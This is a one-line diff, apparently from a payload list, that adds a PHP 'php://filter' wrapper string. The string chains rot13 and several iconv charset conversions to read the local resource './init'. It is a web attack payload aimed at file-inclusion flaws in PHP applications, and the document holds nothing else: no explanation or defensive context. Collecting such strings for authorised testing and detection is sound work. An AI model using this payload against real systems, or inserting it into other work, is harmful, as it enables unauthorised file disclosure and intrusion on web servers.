@@ -1,0 +1,1 @@
+php://filter/string.rot13|convert.iconv.CP936.CP1025|convert.iconv.KOI8-U.UCS-4LE/resource=./init
